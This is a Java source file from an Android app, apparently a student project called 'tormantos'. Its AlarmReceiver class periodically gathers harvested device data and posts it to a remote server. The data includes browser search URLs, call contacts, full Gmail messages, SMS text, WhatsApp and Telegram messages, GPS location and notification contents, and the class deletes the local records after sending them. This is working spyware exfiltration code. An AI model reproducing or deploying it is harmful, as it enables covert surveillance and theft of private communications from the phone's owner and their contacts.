package com.alberto.tfg.tormantos.manager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;

import com.alberto.tfg.tormantos.dto.browsing.ChromeDto;
import com.alberto.tfg.tormantos.dto.browsing.FirefoxDto;
import com.alberto.tfg.tormantos.dto.comunication.DialDto;
import com.alberto.tfg.tormantos.dto.comunication.GmailDto;
import com.alberto.tfg.tormantos.dto.comunication.SmsDto;
import com.alberto.tfg.tormantos.dto.messaging.TelegramDto;
import com.alberto.tfg.tormantos.dto.messaging.WhatsappDto;
import com.alberto.tfg.tormantos.dto.system.GeneralAppDto;
import com.alberto.tfg.tormantos.dto.system.LocationDto;
import com.alberto.tfg.tormantos.dto.system.NotificationDto;
import com.alberto.tfg.tormantos.manager.network.SendDeviceData;
import com.google.gson.JsonObject;

import java.util.Arrays;
import java.util.List;

/**
 * Broadcast receiver in order to make the scheduled database dump
 */
public class AlarmReceiver extends BroadcastReceiver {

    private String androidId;

    @Override
    public void onReceive(Context context, Intent arg1) {

        // Load the android unique identifier
        androidId = Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ANDROID_ID);

        loadDBData();
    }

    private void loadDBData() {

        // -- send browsing data
        sendChromeData();
        sendFirefoxData();

        // -- send communication data
        sendDialData();
        sendGmailData();
        sendSmsData();

        // -- send messaging data
        sendTelegramData();
        sendWhatsappData();

        // -- send system data
        sendGeneralAppData();
        sendLocationData();
        sendNotificationData();
    }

    private void sendChromeData() {
        List<ChromeDto> chromeDtoList = (List<ChromeDto>) (List) DBManager.getAllObjects(ChromeDto.class);
        for (ChromeDto chromeDto : chromeDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("searchUrl", chromeDto.getSearchUrl());
            jsonObject.addProperty("timestamp", chromeDto.getTimestamp().getTime());
            SendDeviceData.postChromeJson(jsonObject);
        }
        DBManager.deleteAllObjects(ChromeDto.class);
    }

    private void sendFirefoxData() {
        List<FirefoxDto> firefoxDtoList = (List<FirefoxDto>) (List) DBManager.getAllObjects(FirefoxDto.class);
        for (FirefoxDto firefoxDto : firefoxDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("searchUrl", firefoxDto.getSearchUrl());
            jsonObject.addProperty("timestamp", firefoxDto.getTimestamp().getTime());
            SendDeviceData.postFirefoxJson(jsonObject);
        }
        DBManager.deleteAllObjects(FirefoxDto.class);
    }

    private void sendDialData() {
        List<DialDto> dialDtoList = (List<DialDto>) (List) DBManager.getAllObjects(DialDto.class);
        for (DialDto dialDto : dialDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("contact", dialDto.getContact());
            jsonObject.addProperty("timestampStart", dialDto.getTimestampStart().getTime());
            jsonObject.addProperty("timestampEnd", dialDto.getTimestampEnd().getTime());
            SendDeviceData.postDialJson(jsonObject);
        }
        DBManager.deleteAllObjects(DialDto.class);
    }

    private void sendGmailData() {
        List<GmailDto> gmailDtoList = (List<GmailDto>) (List) DBManager.getAllObjects(GmailDto.class);
        for (GmailDto gmailDto : gmailDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("sender", gmailDto.getSender());
            jsonObject.addProperty("receivers", Arrays.toString(gmailDto.getReceivers().toArray()));
            jsonObject.addProperty("subject", gmailDto.getSubject());
            jsonObject.addProperty("body", gmailDto.getBody());
            jsonObject.addProperty("timestamp", gmailDto.getTimestamp().getTime());
            SendDeviceData.postGmailJson(jsonObject);
        }
        DBManager.deleteAllObjects(GmailDto.class);
    }

    private void sendSmsData() {
        List<SmsDto> smsDtoList = (List<SmsDto>) (List) DBManager.getAllObjects(SmsDto.class);
        for (SmsDto smsDto : smsDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("content", smsDto.getContent());
            jsonObject.addProperty("receivers", Arrays.toString(smsDto.getReceivers().toArray()));
            jsonObject.addProperty("sendTimestamp", smsDto.getSendTimestamp().getTime());
            SendDeviceData.postSmsJson(jsonObject);
        }
        DBManager.deleteAllObjects(SmsDto.class);
    }

    private void sendTelegramData() {
        List<TelegramDto> telegramDtoList = (List<TelegramDto>) (List) DBManager.getAllObjects(TelegramDto.class);
        for (TelegramDto telegramDto : telegramDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("message", telegramDto.getMessage());
            jsonObject.addProperty("timestamp", telegramDto.getTimestamp().getTime());
            SendDeviceData.postTelegramJson(jsonObject);
        }
        DBManager.deleteAllObjects(TelegramDto.class);
    }

    private void sendWhatsappData() {
        List<WhatsappDto> whatsappDtoList = (List<WhatsappDto>) (List) DBManager.getAllObjects(WhatsappDto.class);
        for (WhatsappDto whatsappDto : whatsappDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("interlocutor", whatsappDto.getInterlocutor());
            jsonObject.addProperty("textList", Arrays.toString(whatsappDto.getTextList().toArray()));
            jsonObject.addProperty("startTimestamp", whatsappDto.getStartTimestamp().getTime());
            jsonObject.addProperty("endTimestamp", whatsappDto.getEndTimestamp().getTime());

            SendDeviceData.postWhatsappJson(jsonObject);
        }
        DBManager.deleteAllObjects(WhatsappDto.class);
    }

    private void sendGeneralAppData() {
        List<GeneralAppDto> generalAppDtoList = (List<GeneralAppDto>) (List) DBManager.getAllObjects(GeneralAppDto.class);
        for (GeneralAppDto generalAppDto : generalAppDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("startTimestamp", generalAppDto.getStartTimestamp().getTime());
            jsonObject.addProperty("endTimestamp", generalAppDto.getEndTimestamp().getTime());
            jsonObject.addProperty("packageName", generalAppDto.getPackageName());

            SendDeviceData.postGeneralAppJson(jsonObject);
        }
        DBManager.deleteAllObjects(GeneralAppDto.class);
    }

    private void sendLocationData() {
        List<LocationDto> locationDtoList = (List<LocationDto>) (List) DBManager.getAllObjects(LocationDto.class);
        for (LocationDto locationDto : locationDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("latitude", locationDto.getLatitude());
            jsonObject.addProperty("longitude", locationDto.getLongitude());
            jsonObject.addProperty("timestamp", locationDto.getTimestamp().getTime());

            SendDeviceData.postLocationJson(jsonObject);
        }
        DBManager.deleteAllObjects(LocationDto.class);
    }

    private void sendNotificationData() {
        List<NotificationDto> notificationDtoList = (List<NotificationDto>) (List) DBManager.getAllObjects(NotificationDto.class);
        for (NotificationDto notificationDto : notificationDtoList) {
            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("userId", androidId);
            jsonObject.addProperty("sourcePackage", notificationDto.getSourcePackage());
            jsonObject.addProperty("notificationContent", notificationDto.getNotificationContent());
            jsonObject.addProperty("timestamp", notificationDto.getTimestamp().getTime());

            SendDeviceData.postNotificationJson(jsonObject);
        }
        DBManager.deleteAllObjects(NotificationDto.class);
    }


}